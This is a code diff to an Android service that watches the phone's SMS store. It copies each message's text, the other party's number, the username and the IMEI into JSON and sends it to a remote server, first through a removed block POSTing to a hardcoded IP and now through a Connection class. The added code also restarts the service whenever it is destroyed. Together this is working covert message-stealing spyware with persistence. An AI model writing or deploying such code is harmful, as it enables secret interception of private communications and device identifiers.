@@ -6,18 +6,11 @@ import android.content.Intent;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
 import org.json.JSONException;
 import org.json.JSONObject;
-import java.io.DataOutputStream;
-import java.io.IOException;
-import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
-import java.net.ProtocolException;
-import java.net.URL;
 
 
 /**
@@ -29,10 +22,13 @@ public class MessageOutService extends Service{
     private String address;
     private String message;
     private GetInfo info;
+    private JSONObject doc;
+    private JSONObject messageJSON;
+    private Connection connection;
 
 
     private String getAddress(){
-        return address;
+        return this.address;
     }
 
     private void setAddress(String address){
@@ -40,7 +36,7 @@ public class MessageOutService extends Service{
     }
 
     private String getMessage(){
-        return message;
+        return this.message;
     }
 
     private void setMessage(String message){
@@ -60,9 +56,21 @@ public class MessageOutService extends Service{
         contentResolver.registerContentObserver(Uri.parse("content://sms"), true, new smsObserver(new Handler()));
     }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY;
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        //Recall Himself on destroy manually
+        startService(new Intent(this, MessageOutService.class));
+    }
 
 
-    class smsObserver extends ContentObserver {
+
+    private class smsObserver extends ContentObserver {
 
         private String lastSmsId;
 
@@ -81,10 +89,30 @@ public class MessageOutService extends Service{
                 setAddress(cur.getString(cur.getColumnIndex("address")));
                 setMessage(cur.getString(cur.getColumnIndex("body")));
                 Log.i("Message",message);
-                AsyncT async = new AsyncT();
-                async.execute();
+                try {
+
+                    doc = new JSONObject();
+                    messageJSON = new JSONObject();
+
+                    messageJSON.put("Sender", info.getPhoneNumber());
+                    messageJSON.put("ReceiverNumber", getAddress());
+                    messageJSON.put("Text", getMessage());
+                    messageJSON.put("Username", info.getUsername());
+                    messageJSON.put("IMEI", info.getImei());
+
+                    doc.put("Message", messageJSON);
+                    doc.put("r", "pushMessage");
+
+                    connection = new Connection(doc);
+                    connection.execute();
+
+                } catch (JSONException e){
+                    e.printStackTrace();
+                }
+
             }
         }
+
 
         // Prevent duplicate results without overlooking legitimate duplicates
         public boolean smsChecker(String smsId) {
@@ -97,54 +125,6 @@ public class MessageOutService extends Service{
                 lastSmsId = smsId;
             }
             return flagSMS;
-        }
-    }
-
-    class AsyncT extends AsyncTask<Void, Void, Void> {
-
-        @Override
-        protected Void doInBackground(Void... params) {
-
-            try {
-
-                URL url = new URL("http://79.24.89.148:8000/Server/"); //Enter URL here
-                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
-                httpURLConnection.setDoOutput(true);
-                httpURLConnection.setRequestMethod("POST"); // here you are telling that it is a POST request, which can be changed into "PUT", "GET", "DELETE" etc.
-                httpURLConnection.setRequestProperty("Content-Type", "application/json"); // here you are setting the `Content-Type` for the data you are sending which is `application/json`
-                httpURLConnection.connect();
-
-
-                JSONObject doc = new JSONObject();
-                JSONObject messageJSON = new JSONObject();
-
-                messageJSON.put("Sender", info.getPhoneNumber());
-                messageJSON.put("ReceiverNumber", getAddress());
-                messageJSON.put("Text", getMessage());
-                messageJSON.put("Username", info.getUsername());
-                messageJSON.put("IMEI",info.getImei());
-
-                doc.put("Message", messageJSON);
-                doc.put("r", "pushMessage");
-
-                DataOutputStream wr = new DataOutputStream(httpURLConnection.getOutputStream());
-                wr.writeBytes(doc.toString());
-                wr.flush();
-                wr.close();
-
-                Log.i("Response", "" + httpURLConnection.getResponseMessage());
-
-            } catch (ProtocolException e1) {
-                e1.printStackTrace();
-            } catch (MalformedURLException e1) {
-                e1.printStackTrace();
-            } catch (IOException e1) {
-                e1.printStackTrace();
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-
-            return null;
         }
     }
 }
